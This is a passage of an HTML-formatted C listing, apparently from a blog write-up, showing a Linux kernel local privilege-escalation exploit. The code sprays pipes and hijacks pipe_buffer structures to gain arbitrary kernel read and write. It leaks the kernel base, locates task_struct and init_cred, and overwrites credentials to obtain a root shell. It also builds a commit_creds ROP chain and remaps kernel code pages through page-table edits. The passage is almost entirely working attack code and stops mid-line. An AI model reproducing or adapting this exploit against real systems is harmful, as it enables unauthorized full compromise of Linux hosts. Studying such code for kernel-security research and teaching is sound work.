<span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid || i == self_2nd_pipe_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">            <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)</span><br><span class="line">            &#123;</span><br><span class="line">                self_3rd_pipe_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                       <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                       self_3rd_pipe_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (self_3rd_pipe_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">        evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid || i == self_2nd_pipe_pid || i == self_3rd_pipe_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">            <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)</span><br><span class="line">            &#123;</span><br><span class="line">                self_4th_pipe_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                       <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                       self_4th_pipe_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (self_4th_pipe_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">        evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">        evil_2nd_buf.len = <span class="number">0xff0</span>;</span><br><span class="line"></span><br><span class="line">        evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="number">3</span>;</span><br><span class="line">        evil_3rd_buf.len = <span class="number">0</span>;</span><br><span class="line">        write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">        evil_4th_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_4th_buf.len = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        vmemmap_base = (<span class="keyword">size_t</span>)info_pipe_buf.page &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line">        <span class="keyword">for</span> (;;)</span><br><span class="line">        &#123;</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(vmemmap_base + <span class="number">157</span> * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (*(<span class="keyword">uint64_t</span> *)buf &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; ((*(<span class="keyword">uint64_t</span> *)buf &amp; <span class="number">0xfff</span>) == <span class="number">0x070</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                kernel_base = *(<span class="keyword">uint64_t</span> *)buf - <span class="number">0x070</span>;</span><br><span class="line">                kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span></span><br><span class="line">                       <span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">                       kernel_base, kernel_offset);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            vmemmap_base -= <span class="number">0x10000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> parent_task, current_task;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking task_struct in memory...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint64_t</span> *comm_addr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">uint64_t</span> *point_buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; <span class="number">1</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(vmemmap_base + i * <span class="number">0x40</span>), point_buf);</span><br><span class="line"></span><br><span class="line">            comm_addr = memmem(point_buf, <span class="number">0xf00</span>, target, <span class="number">0xf</span>);</span><br><span class="line">            <span class="keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="number">-2</span>] &gt; <span class="number">0xffff888000000000</span>) &amp;&amp; (comm_addr[<span class="number">-3</span>] &gt; <span class="number">0xffff888000000000</span>) &amp;&amp; (comm_addr[<span class="number">-57</span>] &gt; <span class="number">0xffff888000000000</span>) &amp;&amp; (comm_addr[<span class="number">-56</span>] &gt; <span class="number">0xffff888000000000</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                parent_task = comm_addr[<span class="number">-57</span>];</span><br><span class="line"></span><br><span class="line">                current_task = comm_addr[<span class="number">-50</span>] - <span class="number">2528</span>;</span><br><span class="line"></span><br><span class="line">                page_offset_base = (comm_addr[<span class="number">-50</span>] &amp; <span class="number">0xfffffffffffff000</span>) - i * <span class="number">0x1000</span>;</span><br><span class="line">                page_offset_base &amp;= <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,</span><br><span class="line">                       (struct page *)(vmemmap_base + i * <span class="number">0x40</span>));</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">                       page_offset_base);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span></span><br><span class="line">                       <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                       current_task);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> command = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> stack_addr;</span><br><span class="line">    <span class="keyword">size_t</span> *tsk_buf;</span><br><span class="line">    <span class="keyword">size_t</span> *mm_struct_buf;</span><br><span class="line">    <span class="keyword">uint64_t</span> mm_struct_addr;</span><br><span class="line">    <span class="keyword">uint64_t</span> mm_struct_page;</span><br><span class="line">    <span class="keyword">uint64_t</span> pgd_addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (command)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking for init_task...&quot;</span>);</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> init_task;</span><br><span class="line">            <span class="keyword">uint64_t</span> init_cred;</span><br><span class="line">            <span class="keyword">uint64_t</span> init_nsproxy;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (;;)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);</span><br><span class="line"></span><br><span class="line">                tsk_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (parent_task &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((struct page *)ptask_page_addr, buf);</span><br><span class="line">                arbitrary_read_by_pipe((struct page *)(ptask_page_addr + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* task_struct::real_parent */</span></span><br><span class="line">                <span class="keyword">if</span> (parent_task == tsk_buf[<span class="number">309</span>])</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                parent_task = tsk_buf[<span class="number">309</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            init_task = parent_task;</span><br><span class="line">            init_cred = tsk_buf[<span class="number">363</span>];</span><br><span class="line">            init_nsproxy = tsk_buf[<span class="number">377</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>, init_nsproxy);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* now, changing the current task_struct to get the full root :) */</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">size_t</span> current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((struct page *)current_task_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            tsk_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">            tsk_buf[<span class="number">363</span>] = init_cred;</span><br><span class="line">            tsk_buf[<span class="number">364</span>] = init_cred;</span><br><span class="line">            tsk_buf[<span class="number">377</span>] = init_nsproxy;</span><br><span class="line"></span><br><span class="line">            arbitrary_write_by_pipe((struct page *)current_task_page, buf, <span class="number">0xff0</span>);</span><br><span class="line">            arbitrary_write_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>),</span><br><span class="line">                                    &amp;buf[<span class="number">512</span> * <span class="number">8</span>], <span class="number">0xff0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            get_shell();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading current task_struct...&quot;</span>);</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">size_t</span> current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)current_task_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            tsk_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">            stack_addr = tsk_buf[<span class="number">4</span>];</span><br><span class="line">            mm_struct_addr = tsk_buf[<span class="number">292</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] kernel stack&#x27;s addr:\033[0m0x%lx\n&quot;</span>, stack_addr);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s addr:\033[0m0x%lx\n&quot;</span>, mm_struct_addr);</span><br><span class="line"></span><br><span class="line">            mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s page:\033[0m0x%lx\n&quot;</span>, mm_struct_page);</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((struct page *)mm_struct_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(mm_struct_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            mm_struct_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (mm_struct_addr &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">            pgd_addr = mm_struct_buf[<span class="number">9</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got kernel page table of current task:\033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                   pgd_addr);</span><br><span class="line">        &#125;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading page table...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>];</span><br><span class="line">            <span class="keyword">size_t</span> idx = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">uint64_t</span> stack_addr_another;</span><br><span class="line">            <span class="keyword">size_t</span> pud_addr, pmd_addr, pte_addr, pte_val;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">            pud_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PGD_ENTRY(stack_addr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">            pmd_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PUD_ENTRY(stack_addr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">            pte_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PMD_ENTRY(stack_addr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">            pte_val = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PTE_ENTRY(stack_addr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line"></span><br><span class="line">            stack_addr_another = pte_val;</span><br><span class="line">            stack_addr_another &amp;= (~PAGE_ATTR_NX);</span><br><span class="line">            stack_addr_another += page_offset_base;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got another virt addr of kernel stack: \033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                   stack_addr_another);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ((<span class="number">0x1000</span> - <span class="number">0x100</span>) / <span class="number">8</span>); i++)</span><br><span class="line">            &#123;</span><br><span class="line">                rop[idx++] = RET + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            rop[idx++] = POP_RDI_RET + kernel_offset;</span><br><span class="line">            rop[idx++] = INIT_CRED + kernel_offset;</span><br><span class="line">            rop[idx++] = COMMIT_CREDS + kernel_offset;</span><br><span class="line">            rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">54</span> + kernel_offset;</span><br><span class="line">            rop[idx++] = *(<span class="keyword">size_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">            rop[idx++] = *(<span class="keyword">size_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">            rop[idx++] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">            rop[idx++] = user_cs;</span><br><span class="line">            rop[idx++] = user_rflags;</span><br><span class="line">            rop[idx++] = user_sp;</span><br><span class="line">            rop[idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">uint64_t</span> stack_page = direct_map_addr_to_page_addr(stack_addr_another);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Hijacking current task&#x27;s stack...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">            arbitrary_write_by_pipe((struct page *)(stack_page + <span class="number">0x40</span> * <span class="number">3</span>), rop, <span class="number">0xff0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading current task_struct...&quot;</span>);</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">size_t</span> current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)current_task_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            tsk_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">            stack_addr = tsk_buf[<span class="number">4</span>];</span><br><span class="line">            mm_struct_addr = tsk_buf[<span class="number">292</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] kernel stack&#x27;s addr:\033[0m0x%lx\n&quot;</span>, stack_addr);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s addr:\033[0m0x%lx\n&quot;</span>, mm_struct_addr);</span><br><span class="line"></span><br><span class="line">            mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s page:\033[0m0x%lx\n&quot;</span>, mm_struct_page);</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((struct page *)mm_struct_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(mm_struct_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            mm_struct_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (mm_struct_addr &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">            pgd_addr = mm_struct_buf[<span class="number">9</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got kernel page table of current task:\033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                   pgd_addr);</span><br><span class="line">        &#125;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> *kcode_map;</span><br><span class="line">            <span class="keyword">size_t</span> dst_paddr, dst_vaddr;</span><br><span class="line"></span><br><span class="line">            kcode_map = mmap((<span class="keyword">void</span> *)<span class="number">0x114514000</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                             MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (!kcode_map)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to create mmap area!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                kcode_map[i] = <span class="string">&quot;0x196082&quot;</span>[i];</span><br><span class="line">                kcode_map[i + <span class="number">0x1000</span>] = <span class="string">&quot;0x196082&quot;</span>[i];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            dst_vaddr = NS_CAPABLE_SETID + kernel_offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] vaddr of ns_capable_setid is: \033[0m0x%lx\n&quot;</span>, dst_vaddr);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">size_t</span> pud_addr, pmd_addr;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">            pud_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PGD_ENTRY(dst_vaddr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">            pmd_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PUD_ENTRY(dst_vaddr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">            dst_paddr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PMD_ENTRY(dst_vaddr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line"></span><br><span class="line">            dst_paddr += <span class="number">0x1000</span> * PTE_ENTRY(dst_vaddr);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                   dst_paddr);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">size_t</span> pte_addr;</span><br><span class="line">            &#123;</span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">                pud_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PGD_ENTRY(<span class="number">0x114514000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">                pmd_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PUD_ENTRY(<span class="number">0x114514000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">                pte_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PMD_ENTRY(<span class="number">0x114514000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">                *(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PTE_ENTRY(<span class="number">0x114514000</span>)) = dst_paddr | <span class="number">0x8000000000000867</span>;</span><br><span class="line">                arbitrary_write_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf, <span class="number">0xff0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            &#123;</span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">                pud_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PGD_ENTRY(<span class="number">0x114514000</span> + <span class="number">0x1000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">                pmd_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PUD_ENTRY(<span class="number">0x114514000</span> + <span class="number">0x1000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">                pte_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PMD_ENTRY(<span class="number">0x114514000</span> + <span class="number">0x1000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">                *(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PTE_ENTRY(<span class="number">0x114514000</span> + <span class="number">0x1000</span>)) = (dst_paddr + <span class="number">0x1000</span>) | <span 